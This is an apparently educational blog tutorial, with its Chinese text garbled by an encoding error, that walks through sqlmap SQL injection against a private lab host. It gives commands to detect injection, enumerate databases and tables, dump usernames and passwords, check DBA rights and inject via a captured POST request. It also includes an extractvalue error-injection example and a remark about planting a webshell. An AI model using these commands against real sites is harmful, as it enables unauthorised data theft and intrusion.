<p><span style="color:aqua;font-size:20px"><strong>å‘ƒï¼Œå¯æ˜¯è¿™ä¹Ÿå¤ªéº»çƒ¦äº†å§ï¼Œåˆè¦åˆ¤æ–­è¿™ä¸ªåˆè¦è¯•é‚£ä¸ªçš„ï¼Œéš¾é“æ²¡æœ‰æ›´ç®€å•çš„æ–¹æ³•å—?</strong></span></p>
<p><span style="color:#2c8af0;font-size:30px"><strong>å½“ç„¶æ˜¯æœ‰çš„ï¼é‚£å°±æ˜¯ä½¿ç”¨è‡ªåŠ¨åŒ–æ³¨å…¥å·¥å…·&ndash;SqlMapï¼</strong></span></p>
<h1 id="sqlmapä½¿ç”¨">SqlMapä½¿ç”¨
</h1><p><strong>ä¸‹è½½åœ°å€ï¼š</strong></p>
<pre tabindex="0"><code class="language-texttext" data-lang="texttext">git clone https://github.com/sqlmapproject/sqlmap.git
</code></pre><h2 id="åŸºæœ¬ä½¿ç”¨æ­¥éª¤">åŸºæœ¬ä½¿ç”¨æ­¥éª¤
</h2><h3 id="æ£€æŸ¥æ³¨å…¥ç‚¹">æ£€æŸ¥æ³¨å…¥ç‚¹
</h3><p><mark><strong>-uï¼šæŒ‡å®šç›®æ ‡url</strong></mark></p>
<p><mark><strong>&ndash;batchï¼šå…¨è‡ªåŠ¨æ¨¡å¼ï¼Œé—®ä»€ä¹ˆéƒ½ç­”å¯¹(y)</strong></mark>`</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627092400221" href="http://picture.928330.xyz/typora/image-20250627092400221.png">
<img src="http://picture.928330.xyz/typora/image-20250627092400221.png" alt="image-20250627092400221"  />
</a>
</div>
</p>
<p>sqlmapæŒ‡å‡ºå®ƒé€šè¿‡å››ç§ä¸åŒçš„æ–¹å¼æˆåŠŸæ³¨å…¥äº†ç›®æ ‡ï¼š</p>
<ul>
<li><strong><code>boolean-based blind</code> (å¸ƒå°”ç›²æ³¨)</strong></li>
<li><strong><code>error-based</code> (æŠ¥é”™æ³¨å…¥)</strong></li>
<li><strong><code>time-based blind</code> (æ—¶é—´ç›²æ³¨)</strong></li>
<li><strong><code>UNION query</code> (è”åˆæŸ¥è¯¢æ³¨å…¥)</strong></li>
</ul>
<p>è€Œç”±å¸ƒå°”ç›²æ³¨çš„<code>payload:id=33 AND 3115=3115</code>å¯ä»¥çœ‹å‡ºæ˜¯æ•°å­—å‹æ³¨å…¥ï¼ˆid=33å‘¨å›´æ— å•å¼•å·ï¼‰</p>
<p>ç”±è”åˆæŸ¥è¯¢æ³¨å…¥çš„<code>target URL appears to have 15 columns in query</code>å¯ä»¥çŸ¥é“ä¸€å…±æœ‰åäº”ä¸ªå­—æ®µ</p>
<h3 id="çˆ†ç ´æ•°æ®åº“ä¿¡æ¯">çˆ†ç ´æ•°æ®åº“ä¿¡æ¯
</h3><p><mark><strong>-dbsï¼šçˆ†ç ´æ‰€æœ‰çš„æ•°æ®åº“åç§°</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --dbs --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627093550491" href="http://picture.928330.xyz/typora/image-20250627093550491.png">
<img src="http://picture.928330.xyz/typora/image-20250627093550491.png" alt="image-20250627093550491"  />
</a>
</div>
</p>
<p><strong><mark>&ndash;current-dbï¼šçˆ†ç ´å½“å‰æ•°æ®åº“åç§°</mark></strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --current-db --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627093857366" href="http://picture.928330.xyz/typora/image-20250627093857366.png">
<img src="http://picture.928330.xyz/typora/image-20250627093857366.png" alt="image-20250627093857366"  />
</a>
</div>
</p>
<p>ç»“æœè¯´æ˜ç°åœ¨çš„è¡¨åä¸ºcms</p>
<h3 id="çˆ†ç ´æŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨å">çˆ†ç ´æŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨å
</h3><p><mark><strong>-Dï¼šæŒ‡å®šæ•°æ®åº“å</strong></mark></p>
<p><mark><strong>&ndash;tablesï¼šæšä¸¾æ‰€æœ‰è¡¨</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -D cms --tables  --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627094523174" href="http://picture.928330.xyz/typora/image-20250627094523174.png">
<img src="http://picture.928330.xyz/typora/image-20250627094523174.png" alt="image-20250627094523174"  />
</a>
</div>
</p>
<h3 id="çˆ†ç ´æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—å">çˆ†ç ´æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—å
</h3><p><mark><strong>-Tï¼šæŒ‡å®šè¡¨å</strong></mark></p>
<p><mark><strong>&ndash;columsï¼šæšä¸¾æ‰€æœ‰åˆ—</strong></mark></p>
<p><strong>æ³¨æ„æ­¤å¤„è¦å…ˆæŒ‡å®šæ•°æ®åº“åï¼Œå†æŒ‡å®šè¡¨åï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -D cms -T cms_users --columns  --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627094938971" href="http://picture.928330.xyz/typora/image-20250627094938971.png">
<img src="http://picture.928330.xyz/typora/image-20250627094938971.png" alt="image-20250627094938971"  />
</a>
</div>
#### extractvalue (XML_document, XPath_string)</p>
<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼š<code>XML_document</code> æ˜¯ç›®æ ‡XMLæ–‡æ¡£</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ï¼š<code>XPath_string</code> <strong>æ˜¯è¯¥XMLæ–‡æ¡£çš„è·¯å¾„ï¼Œå¦‚æœå†™å…¥å…¶ä»–æ ¼å¼å°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”è¿”å›éæ³•æ ¼å¼çš„å†…å®¹</strong></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#c678dd">user</span>,<span style="color:#e06c75">password</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">user_id</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span> <span style="color:#c678dd">and</span> (<span style="color:#e06c75">extractvalue</span>(<span style="color:#d19a66">1</span>,<span style="color:#d19a66">0</span><span style="color:#e06c75">x7e</span>));
</span></span></code></pre></div><p>ç”±äº0x7eæ˜¯~çš„åå…­è¿›åˆ¶ï¼Œè€Œ~ä¸å±äºxpathè¯­æ³•æ ¼å¼ï¼Œå› æ­¤ä¼šæŠ¥å‡ºxpathè¯­æ³•é”™è¯¯</p>
<h4 id="updatexml-xml_document-xpath_string-new_value-1">updatexml (XML_document, XPath_string, new_value)
</h4><h3 id="æ‰“å°æŒ‡å®šåˆ—åçš„å­—æ®µæ•°æ®">æ‰“å°æŒ‡å®šåˆ—åçš„å­—æ®µæ•°æ®
</h3><p><mark><strong>-Cï¼šæŒ‡å®šåˆ—å</strong></mark></p>
<p><mark><strong>&ndash;dumpï¼šå–å‡ºæŒ‡å®šåˆ—åçš„æ‰€æœ‰æ•°æ®</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -D cms -T cms_users -C username,password --dump --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627095213209" href="http://picture.928330.xyz/typora/image-20250627095213209.png">
<img src="http://picture.928330.xyz/typora/image-20250627095213209.png" alt="image-20250627095213209"  />
</a>
</div>
</p>
<h3 id="æŸ¥çœ‹ç”¨æˆ·æƒé™">æŸ¥çœ‹ç”¨æˆ·æƒé™
</h3><p><mark><strong>&ndash;usersï¼šåˆ—å‡ºæ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --users --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627101333092" href="http://picture.928330.xyz/typora/image-20250627101333092.png">
<img src="http://picture.928330.xyz/typora/image-20250627101333092.png" alt="image-20250627101333092"  />
</a>
</div>
</p>
<p><mark><strong>&ndash;current-userï¼šæŸ¥çœ‹å½“å‰è¿æ¥æ•°æ®åº“ç”¨æˆ·</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --current-user --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627101406633" href="http://picture.928330.xyz/typora/image-20250627101406633.png">
<img src="http://picture.928330.xyz/typora/image-20250627101406633.png" alt="image-20250627101406633"  />
</a>
</div>
</p>
<p><mark><strong>&ndash;is-dbaï¼šåˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯DBAï¼ˆæ•°æ®åº“ç®¡ç†å‘˜ï¼‰</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --is-dba --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627101434203" href="C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png">
<img src="C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png" alt="image-20250627101434203"  />
</a>
</div>
</p>
<blockquote>
<p>å¦‚æœæ˜¯æ•°æ®åº“ç®¡ç†å‘˜ï¼Œå°±ä»£è¡¨æœ‰å†™çš„æƒé™ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
</blockquote>
<h3 id="æŸ¥çœ‹æ•°æ®åº“å¯†ç ">æŸ¥çœ‹æ•°æ®åº“å¯†ç 
</h3><p><strong><mark>&ndash;passwordï¼šè‡ªåŠ¨å¯»æ‰¾æœ‰æ²¡æœ‰å¸¸è§çš„ç”¨æˆ·åå’Œå¯†ç åˆ—</mark></strong></p>
<p><strong>å¯ä»¥çœ‹æˆæ˜¯ä¸€ç³»åˆ—æ“ä½œï¼ˆæ‰¾åˆ°passwordè¡¨å’Œdumpï¼‰çš„è‡ªåŠ¨åŒ–</strong>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -passwords
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="" href="http://picture.928330.xyz/typora/image-20250627111514038.png">
<img src="http://picture.928330.xyz/typora/image-20250627111514038.png" alt=""  />
</a>
</div>
</p>
<h2 id="ç»“åˆburpsuiteä½¿ç”¨">ç»“åˆburpsuiteä½¿ç”¨
</h2><p><strong>æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦å¯¹ä¸€ä¸ªè¡¨å•è¿›è¡Œæ³¨å…¥ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨postæ³¨å…¥</strong></p>
<p><strong><mark>-rï¼šä»æ–‡ä»¶åŠ è½½HTTPè¯·æ±‚ï¼Œsqlmapå¯ä»¥ä»ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è·å–HTTPè¯·æ±‚ï¼Œè¿™æ ·å°±å¯ä»¥è·³è¿‡è®¾ç½®ä¸€äº›å…¶ä»–å‚æ•°ï¼ˆæ¯”å¦‚cookieï¼ŒPOSTæ•°æ®ï¼Œç­‰ç­‰ï¼‰</mark></strong></p>
<h3 id="æ‹¦æˆªè¯·æ±‚">æ‹¦æˆªè¯·æ±‚
</h3><p>åœ¨è®¾ç½®ä»£ç†åï¼Œè¡¨å•éšä¾¿å¡«ä¸€ä¸ªå†…å®¹æäº¤ï¼ŒæŸ¥çœ‹postè¯·æ±‚å†…å®¹ï¼Œå¤åˆ¶å¦å­˜ä¸º.txt
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627100838668" href="http://picture.928330.xyz/typora/image-20250627100838668.png">
<img src="http://picture.928330.xyz/typora/image-20250627100838668.png" alt="image-20250627100838668"  />
</a>
</div>
</p>
<h3 id="è¿›è¡Œçˆ†ç ´">è¿›è¡Œçˆ†ç ´
</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -r post.txt --dbs --batch
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627101026867" href="http://picture.928330.xyz/typora/image-20250627101026867.png">
<img src="http://picture.928330.xyz/typora/image-20250627101026867.png" alt="image-20250627101026867"  />
</a>
</div>
</p>
<p>åŒæ ·å¯ä»¥å¾—åˆ°æ­£ç¡®ç»“æœ</p>
<p>è¯¦ç»†çš„sqlmapå­¦ä¹ è¯·å‚è€ƒè¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œéå¸¸å®Œæ•´ï¼Œæ— ä¸ä¼¦æ¯”çš„å¥½ï¼š</p>
<p><a class="link" href="https://www.tr0y.wang/2018/03/21/sqlmap-guide/#sqlmap-%E7%9A%84%E5%90%84%E4%B8%AA%E9%98%B6%E6%AE%B5"  target="_blank" rel="noopener"
    >Tr0y&rsquo;s Blog&ndash;SQLmap ä½¿ç”¨æ‰‹å†Œ
    
    <span style="white-space: nowrap;"><svg width=".7em"
        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
            fill="currentColor">
    </svg></span>
    
</a></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/sql/">SQL</a>
        
    </section>


    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-08-31
        </span>
    </section></footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/">
        
        
            <div class="article-image">
                
                    <img src="http://picture.928330.xyz/typora/SQL-logo.png" loading="lazy" data-key="" data-hash="http://picture.928330.xyz/typora/SQL-logo.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">å¿«é€Ÿå…¥é—¨SQL</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%806dll%E6%B3%A8%E5%85%A5/">
        
        
            <div class="article-image">
                
                    <img src="http://picture.928330.xyz/typora/a09dbc5b24b5dd58f1f021f69aca8682.jpg" loading="lazy" data-key="" data-hash="http://picture.928330.xyz/typora/a09dbc5b24b5dd58f1f021f69aca8682.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">é€†å‘åŸºç¡€6ï¼šDLLæ³¨å…¥</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%805%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF/">
        
        
            <div class="article-image">
                
                    <img src="http://picture.928330.xyz/typora/1942e99d5e2b2ffc67184eba1cfe48ea.jpg" loading="lazy" data-key="" data-hash="http://picture.928330.xyz/typora/1942e99d5e2b2ffc67184eba1cfe48ea.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">é€†å‘åŸºç¡€5ï¼šæ··æ·†æŠ€æœ¯</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/raid%E4%B8%8E%E5%AE%83%E7%9A%84%E9%87%8D%E7%BB%84/">
        
        
            <div class="article-image">
                
                    <img src="http://picture.928330.xyz/typora/56ab540a33f6eab79937c1187dd72855.jpg" loading="lazy" data-key="" data-hash="http://picture.928330.xyz/typora/56ab540a33f6eab79937c1187dd72855.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">RAIDä¸å®ƒçš„é‡ç»„</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%804pe%E6%96%87%E4%BB%B6/">
        
        
            <div class="article-image">
                
                    <img src="http://picture.928330.xyz/typora/d9dc6363235d1bc4e4bf2e1debb14e39.jpg" loading="lazy" data-key="" data-hash="http://picture.928330.xyz/typora/d9dc6363235d1bc4e4bf2e1debb14e39.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">é€†å‘åŸºç¡€4ï¼šPEæ–‡ä»¶</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bilibili","https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji","https://npm.elemecdn.com/@waline/emojis@1.1.0/weibo"],"lang":"zh-cn","locale":{"admin":"Admin","placeholder":null},"pageview":true,"placeholder":"æ¬¢è¿è¯„è®ºï¼Œä¸å¥½çš„è¯„è®ºæˆ‘ä¼šåˆ ğŸ™„ğŸ’…ğŸ»","requiredMeta":["name","email","url"],"serverURL":"https://comment.928330.xyz/"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 2025 - 2025 kakahuote | å¼•ç”¨è¯·æ³¨æ˜æ–‡ç« é“¾æ¥
    </section>

    <section class="running-time">
        è·ç¦»å°ç«™ç¬¬ä¸€è¡Œä»£ç è¢«ç½®ä¸‹å·²ç»è¿‡å»
        <span id="runningdays" class="running-days"></span>    
    </section>  

    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡ <br />

        
        <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
        <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
        

        <span>...å½“ç„¶è¿˜æœ‰kakahuoteğŸ¤“ğŸ‘†</span>
    </section>
</footer>

    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >
    
    <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<style>
   
   
   
  @font-face {
   font-family: 'yuan';
   src: url('https://blog.928330.xyz/font/round.ttf') format('truetype');
  }

   
   
   
  :root {
   --base-font-family: 'yuan';
   --code-font-family: 'yuan';
  }

   
   
   
  #backTopBtn {
   position: fixed;
   bottom: 30px;
   right: 450px;
   z-index: 99;
   cursor: pointer;
   width: 32px;
   height: 32px;
   background-image: url('/icons/backTop.svg');
   background-size: cover;
   background-color: rgba(255, 255, 255, 0.9);
   border-radius: 50%;
   box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
   transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
   transform-origin: center center;
   animation: gentleFloat 3s ease-in-out infinite;
   overflow: visible;
  }

  [data-scheme="dark"] #backTopBtn {
   background-image: url('/icons/backTop-dark.svg') !important;
   background-color: rgba(0, 0, 0, 0.8) !important;
   box-shadow: 0 4px 20px rgba(255, 255, 255, 0.1) !important;
  }

  @media (prefers-color-scheme: dark) {
    #backTopBtn {
      background-image: url('/icons/backTop-dark.svg') !important;
      background-color: rgba(0, 0, 0, 0.8) !important;
      box-shadow: 0 4px 20px rgba(255, 255, 255, 0.1) !important;
    }
    .button-ripple {
      background-image: url('/icons/backTop-dark.svg') !important;
    }
  }

  html[data-scheme="dark"] #backTopBtn,
  body[data-scheme="dark"] #backTopBtn,
  .dark #backTopBtn,
  .dark-mode #backTopBtn {
    background-image: url('/icons/backTop-dark.svg') !important;
    background-color: rgba(0, 0, 0, 0.8) !important;
    box-shadow: 0 4px 20px rgba(255, 255, 255, 0.1) !important;
  }

  html[data-scheme="dark"] .button-ripple,
  body[data-scheme="dark"] .button-ripple,
  .dark .button-ripple,
  .dark-mode .button-ripple {
    background-image: url('/icons/backTop-dark.svg') !important;
  }

  [data-scheme="dark"] #backTopBtn::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    border-left: 6px solid transparent;
    border-right: 6px solid transparent;
    border-bottom: 10px solid #ffffff;
    transform: translate(-50%, -50%);
    z-index: 1;
    display: var(--show-css-arrow, none);
  }

  #backTopBtn::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    border-left: 6px solid transparent;
    border-right: 6px solid transparent;
    border-bottom: 10px solid #000000;
    transform: translate(-50%, -50%);
    z-index: 1;
    display: var(--show-css-arrow, none);
  }

  @keyframes gentleFloat {
   0%, 100% { transform: translateY(0px); }
   50% { transform: translateY(-6px); }
  }

  .button-ripple {
   position: absolute;
   top: 0;
   left: 0;
   width: 32px;
   height: 32px;
   border-radius: 50%;
   background-image: url('/icons/backTop.svg');
   background-size: cover;
   background-repeat: no-repeat;
   background-position: center;
   pointer-events: none;
   z-index: -1;
   animation: buttonRippleExpand 2.5s linear infinite;
   transform-origin: center center;
   will-change: transform, opacity;
   backface-visibility: hidden;
   perspective: 1000px;
   contain: layout style;
   transform: translateZ(0);
   transition: animation-duration 0.3s ease;
   --show-css-arrow: none !important;
   opacity: var(--ripple-opacity, 0.8) !important;
  }

  [data-scheme="dark"] .button-ripple {
   background-image: url('/icons/backTop-dark.svg') !important;
   --show-css-arrow: none !important;
  }

  .button-ripple.hover-mode {
   animation-duration: 1s;
  }

  @keyframes buttonRippleExpand {
   0% { --ripple-opacity: 0.8; transform: scale(1); }
   50% { --ripple-opacity: 0.3; transform: scale(1.5); }
   100% { --ripple-opacity: 0; transform: scale(2.0); }
  }

  .button-tooltip {
   position: absolute;
   bottom: 45px;
   right: 450px;
   background: rgba(0, 0, 0, 0.8);
   color: white;
   padding: 8px 12px;
   border-radius: 6px;
   font-size: 12px;
   white-space: nowrap;
   opacity: 0;
   transform: translateY(10px);
   transition: all 0.3s ease;
   pointer-events: none;
   z-index: 100;
  }

  .button-tooltip.show {
   opacity: 1;
   transform: translateY(0);
  }

  .button-tooltip::after {
   content: '';
   position: absolute;
   top: 100%;
   left: 50%;
   transform: translateX(-50%);
   border: 5px solid transparent;
   border-top-color: rgba(0, 0, 0, 0.8);
  }

  #backTopBtn:hover {
   transform: translateY(-8px) scale(1.1);
   box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
   background-color: rgba(255, 255, 255, 1);
  }

  #backTopBtn.sprinting {
   animation: energyBurst 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
  }

  @keyframes energyBurst {
   0% {
     transform: scale(1) rotate(0deg);
     opacity: 1;
     filter: brightness(1) hue-rotate(0deg);
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
   }
   100% {
     transform: scale(1) rotate(0deg);
     opacity: 1;
     filter: brightness(1) hue-rotate(360deg);
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
   }
  }

